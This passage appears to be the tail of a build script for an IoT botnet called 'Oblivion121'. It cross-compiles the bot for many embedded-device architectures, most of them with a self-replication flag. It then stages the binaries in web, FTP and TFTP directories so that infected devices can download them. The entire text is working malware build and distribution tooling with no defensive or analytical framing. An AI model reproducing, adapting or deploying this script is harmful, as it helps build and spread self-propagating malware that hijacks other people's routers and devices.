...
echo "COMPILING i586"
compile_bot i586 Oblivion121.x86 "-static -DSELFREP"
echo "COMPILING mips"
compile_bot mips Oblivion121.mips "-static -DSELFREP"
echo "COMPILING mipsel"
compile_bot mipsel Oblivion121.mpsl "-static -DSELFREP"
echo "COMPILING armv4l"
compile_bot armv4l Oblivion121.arm "-static -DSELFREP"
echo "COMPILING armv5l"
compile_bot armv5l Oblivion121.arm5 ""
echo "COMPILING armv6l"
compile_bot armv6l Oblivion121.arm6 "-static -DSELFREP"
echo "COMPILING armv7l"
compile_bot armv7l Oblivion121.arm7 "-static -DSELFREP"
echo "COMPILING ppc"
compile_bot powerpc Oblivion121.ppc "-static -DSELFREP"
echo "COMPILING sparc"
compile_bot sparc Oblivion121.spc "-static -DSELFREP"
echo "COMPILING m68k"
compile_bot m68k Oblivion121.m68k "-static -DSELFREP"
echo "COMPILING sh4"
compile_bot sh4 Oblivion121.sh4 "-static -DSELFREP"
cp release/Oblivion121* /var/www/html/bins
cp release/Oblivion121* /var/ftp
mv release/Oblivion121* /var/lib/tftpboot
rm -rf release
###################################################################
